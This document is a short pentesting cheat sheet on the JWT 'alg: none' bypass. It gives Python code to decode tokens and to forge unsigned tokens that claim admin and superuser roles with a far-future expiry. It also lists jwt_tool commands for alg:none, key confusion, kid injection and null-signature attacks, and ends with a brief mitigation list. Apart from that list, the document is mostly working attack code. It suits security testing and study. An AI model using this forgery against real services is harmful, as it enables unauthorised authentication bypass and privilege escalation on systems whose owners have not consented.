# JWT None Algorithm Bypass

Exploiting JWT libraries that accept `alg: none` to forge tokens without the signing key.

## Decode JWT

```python
import base64, json

def decode_jwt(token):
    parts = token.split(".")
    header = json.loads(base64.b64decode(parts[0] + "=="))
    payload = json.loads(base64.b64decode(parts[1] + "=="))
    return header, payload

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"
header, payload = decode_jwt(token)
print(header, payload)
```

## Forge None Algorithm Token

```python
import base64, json

def forge_jwt(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"{h}.{p}."

# Escalate to admin
forged = forge_jwt({"user": "admin", "role": "superuser", "exp": 9999999999})
print(forged)
```

## Test All Algorithm Bypasses

```bash
# Using jwt_tool
python3 jwt_tool.py <token> -X a  # alg:none
python3 jwt_tool.py <token> -X k  # key confusion (RS256->HS256)
python3 jwt_tool.py <token> -X i  # inject kid header
python3 jwt_tool.py <token> -X n  # null signature
```

## Mitigation

- Never accept `alg: none` in production
- Pin allowed algorithms explicitly: `jwt.decode(token, key, algorithms=["HS256"])`
- Validate `iss`, `aud`, `exp` claims
